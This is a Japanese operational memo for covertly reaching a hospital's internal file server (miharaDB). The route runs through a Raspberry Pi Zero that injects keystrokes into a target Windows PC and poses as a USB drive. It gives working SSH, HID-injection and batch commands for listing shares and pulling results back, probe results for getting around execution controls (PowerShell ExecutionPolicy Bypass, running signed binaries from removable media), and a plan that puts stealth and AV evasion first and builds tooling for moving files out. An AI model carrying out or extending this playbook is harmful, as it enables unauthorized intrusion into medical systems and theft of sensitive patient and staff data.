# 対象PC経由 miharaDB クイックアクセスメモ

記録日: 2026-07-29  
場所: この MacBook Air 側（手元）

## いちばん大事なパス

対象 Windows PC（`WF149`）から見える共有:

```text
\\10.4.144.75\miharaDB
```

cmd / バッチでは次でも可（スラッシュ）:

```text
//10.4.144.75/miharaDB
```

**頻回アクセス（玉城先生フォルダ）** → 専用メモ:

- `~/玉城先生フォルダ_クイック参照.md`  
- 実パス: `\\10.4.144.75\miharaDB\004研究室\01 研究室\常勤医師\玉城先生`  
  （`01` のあと**半角スペース**必須。`01研究室` だと見つからない）

## 接続経路

```text
[この MacBook Air]
        ↓ SSH (Host: work-mac)
[職場の外部PC work-mac]
        ↓ SSH
[Raspberry Pi Zero admin@gadget-pi.local]
        ↓ USB (HIDキー入力 + Mass Storage D:)
[対象PC WF149 / 10.4.145.149]
        ↓ SMB
[ファイルサーバ 10.4.144.75\miharaDB]
```

この Mac から `10.4.144.75` へ直接は行けない。  
**必ず対象PC経由**で見る。

## サーバ情報（2026-07-29 時点）

| 項目 | 値 |
|------|-----|
| 対象 | `10.4.144.75` |
| 到達 | Ping OK（数ms、TTL=128） |
| 主に使う共有 | **`miharaDB`**（読取可） |
| 同じサーバで読取可 | `miharaAPP`, `miharagrpweb`, `Movie_Strage`, `ScanDB` |
| 読取拒否 | `Byoreki_Strage`, `JinzaiSupport`, `KaikeiDB`, `Restore`, `SoumuDB`, `SoumuDB2`, `SystemWork`, `C$` |
| 空き表示 | 約 11.3 TB（同一ボリュームっぽい） |

### miharaDB トップ（抜粋）

- `000法人本部` … `012会計課` など部署番号フォルダ
- `014医療情報室`
- `026人材サポート室`
- `099病院` / `100委員会`
- `999システム管理者`
- `◆部署細則・部署マニュアル◆`
- `【【文書事務】】` / `【学術業績】`

### 対象PCネットワーク（参考）

| 項目 | 値 |
|------|-----|
| ホスト名 | `WF149` |
| IP | `10.4.145.149` |
| サブネット | `10.4.144.0/22` |
| ゲートウェイ | `10.4.144.240` |

## 素早くディレクトリを見る手順

長いコマンドを HID で打つと失敗しやすいので、**バッチを D: に置いて実行**する。

### 1. Pi に入る

```bash
ssh -t work-mac 'ssh admin@gadget-pi.local'
```

### 2. 一覧用バッチを作って USB に載せる

```bash
cat > /home/admin/dir-miharaDB.bat << 'BAT'
@echo off
dir "\\10.4.144.75\miharaDB" > D:\result.txt 2>&1
echo === DONE === >> D:\result.txt
BAT

sudo push-to-usb /home/admin/dir-miharaDB.bat
```

サブフォルダを見る例:

```bat
dir "\\10.4.144.75\miharaDB\999システム管理者" > D:\result.txt 2>&1
```

### 3. 対象PCで実行（HID）

```bash
# USB 再認識待ちを少し入れてから
sleep 10
hid-tools win-r
# 少し待ってから cmd → Enter → D:/dir-miharaDB.bat → Enter
# またはまとめて:
sleep 1.5; hid-type "cmd"; sleep 0.6; hid-tools enter
sleep 2.5; hid-type "D:/dir-miharaDB.bat"; sleep 1; hid-tools enter
sleep 20
sudo retrieve-results
ls -lt /home/admin/retrieved/ | head
cat /home/admin/retrieved/*_result.txt | tail -n +1
```

### 4. 手元の Mac から一気にやる（対話なし）

```bash
ssh work-mac 'ssh -o BatchMode=yes admin@gadget-pi.local bash -s' << 'EOF'
cat > /home/admin/dir-miharaDB.bat << 'BAT'
@echo off
dir "\\10.4.144.75\miharaDB" > D:\result.txt 2>&1
BAT
sudo push-to-usb /home/admin/dir-miharaDB.bat
sleep 12
hid-tools win-r; sleep 1.5; hid-type "cmd"; sleep 0.6; hid-tools enter
sleep 2.5; hid-type "D:/dir-miharaDB.bat"; sleep 1; hid-tools enter
sleep 20
sudo retrieve-results
ls -t /home/admin/retrieved/*_result.txt | head -1 | xargs cat
EOF
```

もっと楽にするなら、同梱のヘルパースクリプトを使う:

```bash
~/bin/mihara-dir
~/bin/mihara-dir "999システム管理者"
~/bin/mihara-dir "014医療情報室"
```

## Pi 側の主要コマンド（再掲）

| コマンド | 用途 |
|----------|------|
| `hid-tools run "dir"` | 短い cmd 実行（長文・`\` は不向き） |
| `hid-type "..."` | 文字列キー入力（JIS） |
| `sudo push-to-usb <file>` | ファイルを D: に置く |
| `sudo retrieve-results` | D: から回収（CP932→UTF-8） |
| `hid-keepalive &` | スリープ防止 |

回収先: `/home/admin/retrieved/`

## ハマりポイント

1. **長いコマンドを HID 直打ちしない** → bat を `push-to-usb` して `D:/xxx.bat`
2. **`\\` は bat 内に書く**（HID の `\` は不安定）
3. **実行前に数秒待つ**（USB 再接続後、Windows が D: を認識するまで）
4. **結果が 0 バイト** → 待機不足 / フォーカスずれ / 画面ロックの可能性
5. **`hid-tools run` の待ちが短いと失敗しやすい** → open-cmd 相当で sleep を長めに

## 実行可否プローブ結果（2026-07-29）

対象: `miharanet\wf149` / ホスト `WF149`  
方針: 無害なシステムコマンドと既存ベンダーバイナリのみ（自作PEは未投入）

| 手段 | 結果 | メモ |
|------|------|------|
| `.bat` on D: | **OK** | 運用の本命 |
| `powershell -Command` | **OK** | 使える |
| `powershell -File` | **NG** | Effective policy = **Restricted** |
| `powershell -ExecutionPolicy Bypass -File` | **OK** | Bypass で実行可 |
| `cscript` `.vbs` on D: | **OK** | 書き込み可 |
| `whoami.exe` を D: に copy して実行 | **OK** | リムーバブルからの PE 実行は可能 |
| `hostname.exe` / `tar.exe` を D: から | **OK** | 同上（MS署名） |
| Google `notification_helper.exe` を D: から | **OK** | **非MS（Google LLC 署名）でも実行可** |
| AppLocker effective | 実質なし | 有意なルール収集結果なし |
| SRP | ほぼ未設定 | `authenticodeenabled=0` |
| Device Guard CI | Status **2** | 何らかの CI は有効寄り。ただし上記 PE は通った |
| 導入ソフト | Symantec / Chrome / ATOK 等 | AVあり → **自作未署名 exe は別リスク** |

### まだ未確定

- **完全に未署名の自作 .exe** が通るか（Symantec / スマートスクリーン / CI）
- ステルス優先なら、今は **試さない方がよい**（検知面で一番目立つ）

### 運用への含意

- 常駐 **自作 agent.exe はまだ前提にしない**
- **`.bat` + 必要時だけ `powershell -ExecutionPolicy Bypass -File`** が安全側
- D: からの **既存署名付き PE** は少なくともブロック一択ではない

## 構成判断メモ（ステルス最優先・数MB・work-macから75不可・RNDIS望み薄）

推奨スタック:

1. 機器はそのまま（HID + Mass Storage）
2. 操作は **inbox/outbox + bat/ps1**（HID直打ち最小化）
3. 大容量の逃げ道に 75 を work-mac から使うのは不可 → **転送も USB 経由**
4. 数MBなら USB イメージで実用可能（待ちは「付け外し」が主）
5. Cloudflare Tunnel は **接続の安定化**用。対象PC側のステルスとは独立
6. RNDIS / 自作 exe 常駐は **今は触らない**（目立つ・不確実）

---

## 今後の方針（2026-07-29 決定メモ）

優先度: **ステルス > 安定 > 速度**。ハードは現状維持。改善は運用と SD 上の作業領域で行う。

### 方針の一言

> **D:（`/piusb.bin`）は宅配ボックス。本物の倉庫は Pi の microSD。**  
> 共通イメージは「短い同期のときだけ」触り、あとは SD 上で扱う。

### なぜ USB のつけ外し（再認識）が必要か

`/piusb.bin` は仮想 USB メモリの中身であり、**ブロックデバイスを丸ごと**対象PCに渡している。

| やりたいこと | オーナー | 必要作業 |
|--------------|----------|----------|
| 対象PCが D: を読む/書く | Windows | ガジェット有効のまま |
| Pi が中身を読む/書く（push / retrieve） | Pi | **一度ガジェット切断 → mount → 作業 → umount → 再有効** |

- 同時に両方が同じイメージを持つと、キャッシュ不一致で **壊れる／0バイト／消える**。
- **読むだけでも、Windows がマウント中に Pi が loop mount するのは推奨しない**（未定義に近い）。
- HID（キー入力）は別チャネルなので、**キー入力だけなら切断不要**。
- 体感の遅さの主因は帯域より **オーナー交代 + Windows の D: 再認識待ち**。

スクリプト上の対応（現行）:

```text
echo "" > UDC          … ソフト的に「抜く」
mount /piusb.bin       … Pi が独占
コピー等
umount
echo $UDC > UDC        … 「挿し直す」
sleep して再認識待ち
```

### SD にコピーする方針（扱いやすさの核）

microSD に余裕がある前提で:

1. 共通領域（D: / イメージ）から **すぐ SD 上の自分の領域へコピー**する  
2. 解析・保管・手元への転送は **すべて SD 側**  
3. USB への再アクセスは、次の送受信が必要なときだけ  

これは `retrieve-results` → `/home/admin/retrieved/` の延長線。  
**「SD にコピーできるから切断が不要になる」わけではない。**  
切断は安全に読むための鍵開けで、コピー先が SD でも同じ。

#### 推奨ディレクトリ（Pi 上・未作成なら今後作る）

```text
/home/admin/usb-work/
  inbox/      … 対象PCへ送る予定（push 前のステージ）
  outbox/     … 回収したばかり（retrieve の受け皿）
  archive/    … 日付付きで保管
  staging/    … 編集・結合・一時作業
```

| 場所 | 役割 |
|------|------|
| `D:\` / `/piusb.bin` | 一時の受け渡しのみ。薄く使う。置きっぱなしにしない |
| `/home/admin/usb-work/` | 作業の本体 |
| `/home/admin/retrieved/` | 現行の回収先（移行期は併用可） |

#### 理想の1サイクル

```text
1. 送りたいものを先に全部 inbox/ に置く（SD・切断なし）
2. push 1回で D: にまとめて載せる（切断1回）
3. HID で短い bat を1回実行（D:/run.bat など）
4. retrieve 1回で D: → outbox/（切断1回）
5. あとは SD だけで dir / grep / scp（USB 触らない）
```

つけ外し回数 ＝ 同期回数。**まとめて同期**するのが速度改善の本命。

### 操作方法の方針

| 手段 | 方針 |
|------|------|
| HID 直打ちの長いコマンド | **やめる**（失敗しやすい・遅い） |
| `.bat` on D: | **本命** |
| `powershell -ExecutionPolicy Bypass -File` | 必要なときだけ |
| 自作 `.exe` 常駐 | **しない**（Symantec / 未確定・目立つ） |
| RNDIS（USBネット） | **今は見送り** |
| work-mac から `\\10.4.144.75` | **不可** → 大ファイルも対象PC経由 USB |
| Cloudflare Tunnel | work-mac 接続安定化のみ（任意・対象PC非関与） |

対象PC側の受け渡し規約（今後）:

```text
D:\inbox\    … Pi → 対象PC（指示・ファイル）
D:\outbox\   … 対象PC → Pi（結果・コピー物）
```

（Windows 上のフォルダ名。Pi の `usb-work/inbox` とは「向き」が対になるイメージで揃える）

### やること / やらないこと

**やる**

- SD ステージング（inbox / outbox / archive）
- 1回の UDC サイクルに複数ファイルをまとめる
- `target-put` / `target-get` / `target-run` 的な手元・Pi CLI
- ジョブは bat に書いて push → 実行 → retrieve
- 作業後は D: 上の作業ファイルを消す（ステルス・汚れ防止）
- 数MB・低頻度を前提にした運用

**やらない（当面）**

- 共通イメージの同時マウント（読み取り専用含む）
- 自作未署名 PE の投入試験（ステルス優先）
- RNDIS / 新ネットワークアダプタ
- 対象PCからの不要な広範囲スキャン常習化
- 診断 bat / ps1 の D: 置きっぱなし

### 実装バックログ（優先順の目安）

1. [ ] Pi に `/home/admin/usb-work/{inbox,outbox,archive,staging}` を作成  
2. [ ] `push-to-usb` / `retrieve-results` を上記に ind/out するよう整理（またはラッパ）  
3. [ ] `target-run`（bat 生成 → push → HID 実行 → retrieve → outbox）  
4. [ ] `target-put` / `target-get`（数MBファイル用・まとめて1サイクル）  
5. [ ] 手元 Mac の `~/bin/mihara-dir` を同系統に揃える  
6. [ ] （任意）work-mac へ Cloudflare Tunnel  

### 関連する技術メモ（短く）

- Mass Storage はファイル共有ではなく **ブロックデバイスの貸し出し**  
- 安全な境界は「ガジェット切断中だけ Pi が mount」  
- SD の価値は切断削減ではなく **切断後の作業自由度と履歴**  
- ステルス的には「低頻度・bat 中心・掃除徹底」が現状ハードと最も整合  

---

## 関連メモ

- SSH 接続そのもの: `~/macbookairからgadget-piへのSSH接続.md`
- ヘルパー: `~/bin/mihara-dir`
